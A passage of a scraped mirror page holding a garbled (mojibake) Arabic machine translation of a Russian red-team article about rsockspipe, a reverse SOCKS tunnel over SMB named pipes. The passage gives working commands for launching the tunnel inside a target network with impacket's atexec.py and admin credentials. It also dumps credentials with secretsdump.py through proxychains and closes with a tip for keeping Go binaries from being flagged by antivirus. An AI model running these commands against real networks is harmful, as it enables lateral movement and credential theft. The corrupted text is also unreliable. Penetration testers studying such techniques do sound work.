hljs">rsockspipe.exe -connect xxxx\rsockspipename -socks yyyy:1080 -pass Pass-word1234 proxychains secretsdump.py admin:Passw0rd@yy1.10</code> </pre> <br>  <b>ุงูุฎูุงุฑ 2.</b> ุงูุงุชุตุงู ูู ุงูุฏุงุฎู ุฅูู ุงูุฎุงุฑุฌ ุจูุงุณุทุฉ ุจุฑูุชูููู SMB.  ุนูุฏูุง ุชุชู ูุฑุงูุจุฉ ุงูุงุชุตุงูุงุช ุงูุฎุงุฑุฌูุฉ ุจุฏูุฉ ุจูุงุณุทุฉ ุฌููุน ุจุฑูุชููููุงุช ุงูููุจ ุ ููุณุจุจ ูุง ูุณู ุงููุณุคูููู SMB ... <br><br>  ุนูู ุฌูุงุฒ Windows ุฎุงุฑุฌู (ูุชู ุงูุชุญูู ููู ูู ูุจููุง) (ip: YYYY) ุ ูู ุจุชุดุบูู ุฌุฒุก ุงูุนููู ูู rsockspipe ูุงูุชุธุฑ ุงูุนููุงุก ููุงุชุตุงู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">rsockspipe.exe -listen .\rsockspipename -socks yyyy:1080 -pass Password1234</code> </pre> <br>  ุนูู ุงูุฎุงุฏู ุฏุงุฎู ุงูุดุจูุฉ ุงููุณุชูุฏูุฉ ุ ูู ุจุชุดุบูู ุฌุฒุก ุงูุนููู (ูุฃูุถูุง ุนุจุฑ impacket): <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">./atexec.py administrator:adminPassw0rd@&lt;ext server IP&gt; "rsockspipe.exe -connect YYYY\rsockspipename -pass Password1234"</code> </pre> <br>  ุจุนุฏ ุงุชุตุงู ูุงุฌุญ ุ ูููููุง ุงุณุชุฎุฏุงู ุฎุงุฏููุง ูู soscks5: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">proxychains secretsdump.py admin:Passw0rd@yy1.10</code> </pre> <br>  ููุงู ููุทุฉ ูุงุญุฏุฉ ููุง ุ ุฎุงุตุฉ ูู ุงูุฎูุงุฑ ุงูุซุงูู.  ุชุฐูุฑ ุฃููุง ูููุง ุฃูู ูู ุฃุฌู ุงุชุตุงู ูุงุฌุญ ุจุงูุฃูุจูุจ ุ ูุฌุจ ุฃู ูููู ูุฎูููู ูู ุฌุงูุจ ุงูุฎุงุฏู ุ ุฃู  ูุจู ุจุฏุก ุชุดุบูู ุงูููู ุ ูุญุชุงุฌ ุฅูู ุงููุฑูุฑ ุนุจุฑ ุงูุชุฑุฎูุต.  ููููู ุงูููุงู ุจุฐูู ุจูุฐู ุงูุทุฑููุฉ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">net use \\yyyy\ipc$ /user:&lt;usrname&gt; &lt;Password1&gt;</code> </pre> <br>  ูุฐูู ... ูู ุญุงูุฉ ุงูุงุณุชุฎุฏุงู ุงูุซุงููุฉ ุ ูุชู ุชุดุบูู ุงูุฃูุฑ net use ุนูู ุงูุฌูุงุฒ ุงููุฏู.  ููุฐุง ูุนูู ุฃูู ุนูู ุงูุฌูุงุฒ ุงููุฏู (ูู ุฐุงูุฑุฉ ุนูููุฉ lsass) ุชุธู ููุงู ุฃุฑุตุฏุฉ ูู ุฌูุงุฒ Windows.  ูุฅุฐุง ูุงููุง ูุณุฆูููู (ูููุงุนุฏุฉ ุนุงูุฉ ุ ูุฅู ุฌููุน ุงููุชุณูููู ุงููุจุชุฏุฆูู ูุนูููู ูู ุงููุดุฑู ...) ุ ูุฅู ูุฐุง ูููู ุฃู ูุคุฏู ุฅูู "ุชุญูุฉ ุฅูู ุงููุฑุงุก" ูู BlueTeam ... ุจุดูู ุนุงู ุ ุชููุฑ ุนูุฏูุง ุชูุนู ุดูุฆูุง ... <br><br><h3 style=";text-align:right;direction:rtl">  ุจุฏูุง ูู ุงูุงุณุชูุชุงุฌ </h3><br>  ุจุดูู ุนุงู ุ ุชุจูู ุฃู ุงูููู ุฌูุฏ ุฌุฏูุง ... ุงูุดูุก ุงูุฑุฆูุณู ูู ุฃูู ุฌุงูุฒ ููุงุณุชุฎุฏุงู ุงููุดุท. <br>  ุงูููุฏ ุงููุตุฏุฑู ุ ููุฐูู ุงูุซูุงุฆูุงุช ุงููุชุฑุฌูุฉ ุจุงููุนู ูู x86 ู x64 ุ ููุฌูุฏุฉ ุนูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุจูุงุจุฉูุง</a> <br><br>  ูุฅุถุงูุฉ ุตุบูุฑุฉ.  ูู ุงูุขููุฉ ุงูุฃุฎูุฑุฉ ุ ุจุฏุฃูุง ููุงุญุธูู ุฃู ุจุฑูุงูุฌ Golang ุงููุชุฑุฌูุฉ ูู ูุถุน Win GUI (ุงูุชุญููู ุงูุจุฑูุฌู ูู ุงููุถุน: go build -ldflags = "- H windowsgui") ูุฏ ุชู ุฅุทูุงูู ุจุดุฏุฉ ุจูุงุณุทุฉ ุจุนุถ ุญููู ููุงูุญุฉ ุงูููุฑูุณุงุช (KAV ุ SEP14).  ูุชุนูู ุงูุฃูุฑ ุจุงููุนู ุจุงูุณุฎููุฉ - ุชู ุงูุชุดุงู "Hello World" ุงููุชุฑุฌูุฉ ูู ูุถุน ูุงุฌูุฉ ุงููุณุชุฎุฏู ุงูุฑุณูููุฉ ูุจุฑูุงูุฌ ุถุงุฑ.  ูุจุฏู ุฃู ูุฐุง ูุฑุฌุน ุฅูู ุญูููุฉ ุฃู Golang ุฃุตุจุญ ุฃุฏุงุฉ ููุถูุฉ ููุจุฑุงูุฌ ุงูุถุงุฑุฉ.  ูุฐุง ูุฅู ูุตูุญุชูุง ูู ุชุฑุฌูุฉ ุงููุดุฑูุน ูู ูุถุน ูุญุฏุฉ ุงูุชุญูู ุงูููุงุณูุฉ ุ ููุน ูุงูุฐุฉ cmf ุณูุฏุงุก ูุนุฑู ุงููุชุณูู ุงูุญูููู ููููุฉ ุงูุชุนุงูู ูุนู (ุนูู ุณุจูู ุงููุซุงู ุ ููุณ ุงููุดููุฉ ุ ุนูู ุณุจูู ุงููุซุงู). <br><br>  ููุงุญุธุฉ: "ุงูุฅุฌุฑุงุกุงุช ุงููุฏูุฑุฉ ุงูุฃูุซุฑ ูุงุฆุฏุฉ" ูู ุตูุงุบุฉ D. Samartsev ุ ูุฏูุฑ BiZone.  ูู ูุฐู ุงูุญุงูุฉ ุ ูุตู ุจุฏูุฉ ุฃูุซุฑ ุนูู ุงุฎุชุตุงุตูู RedTeam. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/ar460659/">https://habr.com/ru/post/ar460659/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar460643/index.html">ุชูุฒูุน ููุญุฏ ููููุงุท ุนูู ุงููุฑุฉ</a></li>
<li><a href="../ar460645/index.html">ุนูู ุงูุฎูุฑ: ุณูุก ูุชุงุจุฉ ุงูุดุฑ ูุน Go ุ ุงูุฌุฒุก 1</a></li>
<li><a href="../ar460647/index.html">ุญู ูุธููุฉ ูุน pwnable.kr 05 - ุฑูุฒ ุงููุฑูุฑ. ุฃุนุฏ ูุชุงุจุฉ ุฌุฏูู ุงุฑุชุจุงุท ุงูุฅุฌุฑุงุก ูู ุฎูุงู ูุดููุฉ ุนุฏู ุญุตุงูุฉ ุณูุณูุฉ ุงูุชูุณูู</a></li>
<li><a href="../ar460651/index.html">ุงุฌุชูุงุน ุฌูุนูุฉ ุงุฎุชุจุงุฑ ูุฌููู: TMS ุ ุฑุตุฏ ุงูุฑุตุฏ ุ ูุชูููู ุฌูุฏุฉ ุงูุจุญุซ ูุงุฎุชุจุงุฑุงุช ุฏุงุฆุฑุฉ ุงูุฑูุงุจุฉ ุงูุฏุงุฎููุฉ ุงูุฃุตููุฉ</a></li>
<li><a href="../ar460655/index.html">ููู ูุณุฑุช ุจุฑููุฉ</a></li>
<li><a href="../ar460661/index.html">ูู ูุง ุชุญุชุงุฌ ููุนุฑูุชู ุญูู Node.js</a></li>
<li><a href="../ar460665/index.html">ูุณูุฏุฉ ุงูุฃุณุฆูุฉ ุงูุดุงุฆุนุฉ: ููุงุฐุง ุชุธูุฑ ูุนุงููุฑ C ++ ูู ุซูุงุซ ุณููุงุชุ</a></li>
<li><a href="../ar460667/index.html">ุฃุชูุชุฉ ุงุฎุชุจุงุฑ ุงูุฎุฏูุงุช ุงููุฏููุนุฉ ุนูู iOS</a></li>
<li><a href="../ar460669/index.html">ููููุฉ ุถูุงู ุณูุงูุฉ ุงูุชูููุฉ ุ ูุชูููุฑ ุงูููุช ูุงูุฃุนุตุงุจ</a></li>
<li><a href="../ar460671/index.html">ุงูููููุฉ ูุงูุงูุชุฑุงุถ ูู ุฏ</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>